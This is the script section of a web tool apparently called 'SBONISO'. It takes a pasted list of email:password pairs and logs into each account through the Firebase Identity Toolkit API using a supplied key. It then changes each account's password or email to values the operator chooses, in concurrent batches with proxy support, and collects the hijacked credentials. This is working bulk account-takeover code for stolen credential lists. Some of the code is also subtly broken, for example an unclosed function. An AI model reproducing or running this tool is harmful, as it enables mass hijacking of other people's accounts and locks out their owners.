    <script>
        // State Management
        let isRunning = false;
        let isPaused = false;
        let stopRequested = false;
        let audioEnabled = true;
        let auditReport = []; // Stores detailed records for CSV export
        let successCredentials = [];

        // Web Audio API Sound Synthesizer
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        function playSound(type) {
            if (!audioEnabled) return;
            if (audioCtx.state === 'suspended') {
                audioCtx.resume();
            }
            try {
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                
                const now = audioCtx.currentTime;
                if (type === 'success') {
                    osc.type = 'sine';
                    osc.frequency.setValueAtTime(587.33, now); // D5
                    osc.frequency.exponentialRampToValueAtTime(880, now + 0.15); // A5
                    gain.gain.setValueAtTime(0.1, now);
                    gain.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
                    osc.start(now);
                    osc.stop(now + 0.3);
                } else if (type === 'error') {
                    osc.type = 'sawtooth';
                    osc.frequency.setValueAtTime(150, now);
                    osc.frequency.linearRampToValueAtTime(100, now + 0.2);
                    gain.gain.setValueAtTime(0.1, now);
                    gain.gain.exponentialRampToValueAtTime(0.001, now + 0.25);
                    osc.start(now);
                    osc.stop(now + 0.25);
                } else if (type === 'complete') {
                    osc.type = 'triangle';
                    osc.frequency.setValueAtTime(440, now);
                    osc.frequency.setValueAtTime(554.37, now + 0.1);
                    osc.frequency.setValueAtTime(659.25, now + 0.2);
                    gain.gain.setValueAtTime(0.12, now);
                    gain.gain.exponentialRampToValueAtTime(0.001, now + 0.5);
                    osc.start(now);
                    osc.stop(now + 0.5);
                }
            } catch (e) {
                // Audio context fallback suppression
            }
        }

        function toggleAudio() {
            audioEnabled = !audioEnabled;
            document.getElementById('audioStatus').innerText = audioEnabled ? "Sound On" : "Muted";
            document.getElementById('audioToggle').style.opacity = audioEnabled ? "1" : "0.5";
        }

        function setTheme(themeName) {
            document.documentElement.setAttribute('data-theme', themeName);

        function toggleInputs() {

            let emailFields = document.getElementById('emailFields');
            let passField = document.getElementById('newpass');
            let passLabel = document.getElementById('passLabel');
            
            emailFields.style.display = (mode === 'email' || mode === 'both') ? 'block' : 'none';
            if (mode === 'email') {
                passLabel.innerText = "Current Password Verification";
                passField.placeholder = "Current Password required for login check";
            } else {
                passLabel.innerText = "New Target Password";
                passField.placeholder = "Enter New Secure Password";
            }
        }

        function logMessage(msg, className = '') {
            let log = document.getElementById('status');
            let span = document.createElement('div');
            span.className = className;
            span.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            log.appendChild(span);
            log.scrollTop = log.scrollHeight;
        }

        // Controls
        function pauseTurbo() {
            isPaused = true;
            document.getElementById('btnPause').disabled = true;
            document.getElementById('btnResume').disabled = false;
            logMessage("â¸ Batch queue paused by user.", "text-yellow-400");
            document.getElementById('progressText').innerText = "Paused...";
        }

        function resumeTurbo() {
            isPaused = false;
            document.getElementById('btnPause').disabled = false;
            document.getElementById('btnResume').disabled = true;
            logMessage("â–¶ Resuming batch queue...", "text-blue-400");
            document.getElementById('progressText').innerText = "Processing accounts...";
        }

        function stopTurbo() {
            stopRequested = true;
            isPaused = false;
            logMessage("â¹ Stop requested. Terminating worker threads safely...", "text-rose-400");
        }

        function setButtonsState(running) {
            document.getElementById('btnStart').disabled = running;
            document.getElementById('btnStart').style.opacity = running ? "0.5" : "1";
            document.getElementById('btnPause').disabled = !running;
            document.getElementById('btnPause').className = running ? "bg-amber-600 hover:bg-amber-500 text-black py-3 px-2 rounded-lg text-xs font-bold uppercase tracking-wider transition cursor-pointer" : "bg-gray-800 text-gray-400 py-3 px-2 rounded-lg text-xs font-bold uppercase tracking-wider cursor-not-allowed";
            document.getElementById('btnStop').disabled = !running;
            document.getElementById('btnStop').className = running ? "bg-rose-600 hover:bg-rose-500 text-white py-3 px-2 rounded-lg text-xs font-bold uppercase tracking-wider transition cursor-pointer" : "bg-rose-950/40 border border-rose-900/60 text-rose-400 py-3 px-2 rounded-lg text-xs font-bold uppercase tracking-wider cursor-not-allowed";
        }

        async function startTurbo() {
            let mode = document.getElementById('workMode').value;
            let listStr = document.getElementById('list').value.trim();
            let newP = document.getElementById('newpass').value.trim();
            let baseE = document.getElementById('baseEmail').value.trim();
            let dCount = parseInt(document.getElementById('digitCount').value) || 4;
            let key = document.getElementById('ver').value;
            let threadCount = parseInt(document.getElementById('threadCount').value) || 3;
            let proxy = document.getElementById('proxyInput').value.trim();

            if (!listStr) { alert("Please paste your account list!"); return; }
            if (mode !== 'email' && !newP) { alert("Please enter new password!"); return; }
            if ((mode === 'email' || mode === 'both') && !baseE) { alert("Please enter email base name!"); return; }

            let rawLines = listStr.split('\n');
            let accounts = [];
            for (let line of rawLines) {
                line = line.trim();
                if (line.includes(':')) {
                    let parts = line.split(':');
                    let e = parts[0].trim();
                    let p = parts.slice(1).join(':').trim(); // handle passwords with colons
                    accounts.push({ email: e, pass: p });
                }
            }

            if (accounts.length === 0) { alert("No valid Email:Password entries found!"); return; }

            // Reset UI Metrics
            isRunning = true;
            isPaused = false;
            stopRequested = false;
            setButtonsState(true);
            auditReport = [];
            successCredentials = [];
            document.getElementById('successList').value = "";
            document.getElementById('successCountBadge').innerText = "0 Items";
            
            let total = accounts.length;
            let completed = 0;
            let successCount = 0;
            let failedCount = 0;
            let startTime = Date.now();

            logMessage(`ðŸš€ [SBONISO] Started batch execution. Mode: ${mode.toUpperCase()} | Accounts: ${total} | Threads: ${threadCount}`);

            // Queue processing worker pool function
            let currentIndex = 0;

            async function worker() {
                while (currentIndex < accounts.length && !stopRequested) {
                    while (isPaused && !stopRequested) {
                        await new Promise(r => setTimeout(r, 200));
                    }
                    if (stopRequested) break;

                    let accIndex = currentIndex++;
                    let acc = accounts[accIndex];

                    // Generate Random Email if required
                    let min = Math.pow(10, dCount - 1);
                    let max = Math.pow(10, dCount) - 1;
                    let randomNum = Math.floor(Math.random() * (max - min + 1)) + min;
                    let targetEmail = (mode === 'email' || mode === 'both') ? `${baseE}${randomNum}@gmail.com` : acc.email;
                    let targetPass = (mode === 'pass' || mode === 'both') ? newP : acc.pass;

                    // Execute request against Firebase Identity Toolkit API
                    let resData = await processAccountRequest(acc.email, acc.pass, targetEmail, targetPass, mode, key);

                    completed++;
                    if (resData.success) {
                        successCount++;
                        playSound('success');
                        successCredentials.push(`${targetEmail}:${targetPass}`);
                        document.getElementById('successList').value = successCredentials.join('\n');
                        document.getElementById('successCountBadge').innerText = `${successCount} Items`;
                        logMessage(`âœ… OK: ${acc.email} -> ${targetEmail}`, "text-emerald-400");
                        auditReport.push({ oldEmail: acc.email, newEmail: targetEmail, newPass: targetPass, status: 'SUCCESS', error: '' });
                    } else {
                        failedCount++;
                        playSound('error');
                        logMessage(`âŒ FAIL: ${acc.email} (${resData.error})`, "text-rose-400");
                        auditReport.push({ oldEmail: acc.email, newEmail: targetEmail, newPass: targetPass, status: 'FAILED', error: resData.error });
                    }

                    // Update Dashboard Stats & Progress
                    let percent = Math.round((completed / total) * 100);
                    document.getElementById('statTotal').innerText = `${completed} / ${total}`;
                    document.getElementById('statSuccess').innerText = successCount;
                    document.getElementById('statFailed').innerText = failedCount;
                    document.getElementById('statProgressText') || '';
                    document.getElementById('progressPercent').innerText = `${percent}%`;
                    document.getElementById('progressBar').style.width = `${percent}%`;

                    // Calculate ETA
                    let elapsed = (Date.now() - startTime) / 1000;
                    let rate = completed / elapsed; // items per second
                    let remainingItems = total - completed;
                    let etaSeconds = rate > 0 ? Math.round(remainingItems / rate) : 0;
                    let etaMin = Math.floor(etaSeconds / 60).toString().padStart(2, '0');
                    let etaSec = (etaSeconds % 60).toString().padStart(2, '0');
                    document.getElementById('statEta').innerText = `${etaMin}:${etaSec}`;

                    // Small thread tick yield
                    await new Promise(r => setTimeout(r, 50));
                }
            }

            // Spawn concurrent worker threads
            let workers = [];
            let activeThreads = Math.min(threadCount, accounts.length);
            for (let t = 0; t < activeThreads; t++) {
                workers.push(worker());
            }

            await Promise.all(workers);

            isRunning = false;
            setButtonsState(false);
            document.getElementById('btnPause').disabled = true;
            document.getElementById('btnResume').disabled = true;
            document.getElementById('progressText').innerText = stopRequested ? "Aborted by user" : "Batch execution complete!";
            
            if (!stopRequested) {
                playSound('complete');
                logMessage(`ðŸ --- BATCH COMPLETED SUCCESSFULLY. Total Success: ${successCount}, Failed: ${failedCount} ---`, "text-cyan-400 font-bold");
            } else {
                logMessage(`âš ï¸ --- BATCH ABORTED BY USER ---`, "text-yellow-400 font-bold");
            }
        }

        async function processAccountRequest(e, p, targetE, targetP, mode, key) {
            try {
                // Step 1: Verify Password / Login
                let res1 = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${key}`, {
                    method: 'POST',
                    body: JSON.stringify({ email: e, password: p, returnSecureToken: true }),
                    headers: { 'Content-Type': 'application/json' }
                });
                let d1 = await res1.json();

                if (d1.idToken) {
                    let updateData = { idToken: d1.idToken, returnSecureToken: true };
                    
                    if (mode === 'pass') {
                        updateData.password = targetP;
                    } else if (mode === 'email') {
                        updateData.email = targetE;
                    } else if (mode === 'both') {
                        updateData.email = targetE;
                        updateData.password = targetP;
                    }

                    // Step 2: Update account credentials
                    let res2 = await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${key}`, {
                        method: 'POST',
                        body: JSON.stringify(updateData),
                        headers: { 'Content-Type': 'application/json' }
                    });

                    if (res2.ok) {
                        return { success: true };
                    } else {
                        let d2 = await res2.json();
                        let errMsg = d2.error && d2.error.message ? d2.error.message : 'Update failed';
                        return { success: false, error: errMsg };
                    }
                } else {
                    let errMessage = d1.error && d1.error.message ? d1.error.message : 'Invalid credentials';
                    return { success: false, error: errMessage };
                }
            } catch (err) {
                return { success: false, error: 'Network / CORS error' };
            }
        }
